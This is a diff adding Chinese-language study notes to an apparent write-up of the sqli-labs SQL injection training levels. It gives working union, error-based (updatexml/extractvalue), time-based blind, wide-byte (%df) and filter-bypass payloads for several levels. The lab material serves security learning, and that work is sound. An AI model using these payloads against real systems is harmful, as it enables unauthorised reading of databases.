@@ -1,3 +1,69 @@
+### 知识点汇总
+
+    ```bash
+    select * from information_schema.tables where table_schema="security";
+
+    select table_schema,table_name from information_schema.tables where table_schema="security";
+
+
+    select * from information_schema.columns where table_schema="security";
+
+    select table_name,column_name from information_schema.columns where table_schema="security";
+
+    select 1,column_name from information_schema.columns where table_name="users";
+
+    select * from information_schema.columns   where table_schema="security" and table_name='users';
+
+    ```
+
+### XPATH报错
+
++  @ extractvalue()
+[… and extractvalue(1,concat('^',(select version()),'^'))--+]
+
++ @ updatexml()
+[… and updatexml(1,concat('^',(select version()),'^'),1)--+]
+
++ NUL (0x00) --> \0  [This is a zero, not the letter O]
+
++ BS  (0x08) --> \b
+
++ TAB (0x09) --> \t
+
++ LF  (0x0a) --> \n
+
++ CR  (0x0d) --> \r
+
++ SUB (0x1a) --> \Z
+
++ "   (0x22) --> \"
+
++ %   (0x25) --> \%
+
++ '   (0x27) --> \'
+
++ \   (0x5c) --> \\
+
++ _   (0x5f) --> \_
++ all other non-alphanumeric characters with ASCII values
+
++ less than 256  --> \c where 'c' is the original non-alphanumeric character.
+
++ %0a  新建一行 
+
++ %0b  Tab 键 （垂直）
+
++ %0c  新的一页 
+
++ %0d return 功能
+
++ %09  Tab （水平）
+
++ %a0   空格 
+
+
+
+
 ## Less-1
 
  + 是否有报错,是否回显(数据库数据回显界面,首先考虑联合查询方式)
@@ -434,6 +500,10 @@
 
 + 注入后 刷新界面。注意 COOKIE 字段 需要 双引号 包围 ！！！
 
+## Content Type  类型
+
+ ![](img/contenttype.png)
+
 ## Less-21
 
 + 正常用户名:Dumb密码:Dumb 输入， 页面回显 YOUR COOKIE : uname = RHVtYg== and expires: Sat 08 Oct 2022 - 11:50:48
@@ -615,6 +685,23 @@
     ```
 ![](img/Less-22.5.png)
 
+## Less-25a 
+
++ 输入
+？id=1'或” 页面报错 ，报错一样 ，通过报错信息的不到有价值的消息 
+同时后面接 --+ 或者#  均没有反应 
+
++ 尝试多次 直接 输入 --+ 强制闭合 
+
++ 然后输入 注入语句 
+发现 and or  被过滤  
+
++ 使用 union select  注入
+```bash
+?id=-1 union select 1,version(),2  --+
+```
+![](img/less-25a.1.png)
+
 ## Less-26 
 
 + 输入参数正常显示，参数后添加 单引号 ‘ ， 双引号 ” 小括号 ）  
@@ -650,10 +737,167 @@
 
 ![](img/Less-26.6.png)
 
-Less-20
+ 
+## Less-26a
 
-是否有报错,是否回显
++ 输入:
+```bash
+?id=1"  # 页面显示正常， 
+?id=1’  # 页面报错， 报错可知，闭合方式 ： ‘ 单引号 
+强制注释 
+```
+注入测试：
+```bash
+?id=1'oORr'1'='1   # 页面回显正常 
+```
 
-注入方式:
+## Less-27
 
-注入Payload
++ 正常输入id参数， ；页面提示 union select 被过滤 ，所有 考虑报错注入，或者其他注入方式 
+
++ 发现 空格被过滤。 考虑用%0a  代替空格 ， 
+
++ 输入 ?id=1'   # 页面报错 ，通过报错信息可知 ，闭合方式： ‘   单引号    
+字符型 
+
++ 注入测试：
+```bash  
+?id=1'or'1      # 页面和和谐
+```
+
++ 注入 Payload :
+```bash
+?id=1' %0aand%0aupdatexml(1,concat('^',(select%0aversion()),'^'),1)or '1  
+```
+
+![](img/less-27.3.png)
+
+## Less-28
+
++ 输入 
+?id=1'   # 页面报错 ，通过报错信息可知 ，闭合方式： ‘   单引号    
+字符型 
+
++ 注入测试：
+```bash
+?id=1'and%0asleep(5)%0aor '1   # 页面显示正常，按出F12调试界面，网络 延时5秒。
+
+?id=1'and%0aif(1=1,sleep(5),1)%0aor '1   # 页面显示正常，按出F12调试界面，网络 延时5秒。
+```
+
++ 注入Payload :
+```bash
+?id=1'and%0aif(database()='security',sleep(5),1)%0aor '1    #延时盲注  
+```
++ 如果禁用 sleep()函数 ，可以考虑 用个 "复杂的密码学运算，哈希运算 "
+
+![](img/less-28.1.png)
+
+![](img/less-28.2.png)
+
+## Less-29
+
++ 输入?id=2'  页面回显报错 ，通过报错信息 可知。 闭合方式： ‘  单引号 ，同时 ，单引号带入数据库时，被编码为 ’ --> %27  
+
++ 输入：
+```bash
+?id=2' or '1       		# 页面很和谐 ，Hint: The Query String you input is: id=2%27%20or%20%271
+```
+
++ 注入Payload :
+```bash
+?id=2' and updatexml(1,concat('^',(select version()),'^'),1) or '1    # 注入成功，回显版本号 ，同时页面显示 ：Hint: The Query String you input is: id=2%27%20and%20updatexml(1,concat(%27^%27,(select%20version()),%27^%27),1)%20or%20%271
+```
+
+
+![](img/less-29.1.png)
+
+## Less-32
+
++ 输入 id=1'  被转义成了： 1\'    (315c27) 
+
++ 输入 id=1”  被转义成了：1\"  (315c22)
+
+![](img/less-32.1.png)
+
++ 输入：
+```bash
+?id=2%df'   #页面回显报错， 通过报错信息 可知 
+闭合方式：  ‘  单引号   字符型注入、
+```
++ 测试Payload: 
+```bash
+  ?id=2%df' --+    # 发现页面很和谐 
+ ?id=2%df' union select 1,2,3 --+          # 发现页面很和谐
+```
++ 注入Payload: 
+```bash
+?id=-2%df' union select 1,2,3 --+
+?id=2%df'and 1=2 union select 1,2,3 --+
+
+?id=2%df'and 1=2 union select 1,version(),3 --+
+``` 
+
++ 0xdf5c  一个汉字  GBK编码格式
+
+![](img/less-32.1.png)
+
+## Less-33 
+
++ 方法同 Less-32 一样 
+
+![](img/less-33.1.png)
+
+## Less-34 
+
++ 正常输入用户名后加 ’ “  后，均被反斜杠 转义
+
++ 所以考虑输入 GBK字符集中的 值  %df
+
++ 注入方法 ：
+
++ 用bp 抓包修改 POST数据 可以发现，页面返回错误 。通过错误信息 可得，
+
++闭合方式： ‘  单引号   字符型注入
+
+ 
+```bash
+uname=admin%df%27 -- &passwd=admin&submit=Submit
+
+```
+## Less-35
+
++ 输入 id=1' "  均被转义了 使用 Addslashes() 函数   ，同时页面回显报错， 通过报错信息可知：
+
+![](img/less-35.1.png)
+
++ 闭合方式： ’ 或 ”    数字型注入 
+
++ Addslashes() 函数对数字型注入 不起作用，直接 --+ 注释后面即可 开始注入 
+
+
+
++ 所以不需要输入直接注入 ：
+
+```bash
+?id=-1 union select 1,2,3 --  
+```
+
+## Less-36 
+
++ 宽字节注入 同Less-32关
+
+
+## Less-37
+
++ 同 Less-34 关一样 
+
+
+## Less-38 
+
+![](img/less-38.1.png)
+
+```bash
+?id=2' and updatexml(1,concat('^',(select version()),'^'),1)or '-- 
+```
+![](img/less-38.3.png)
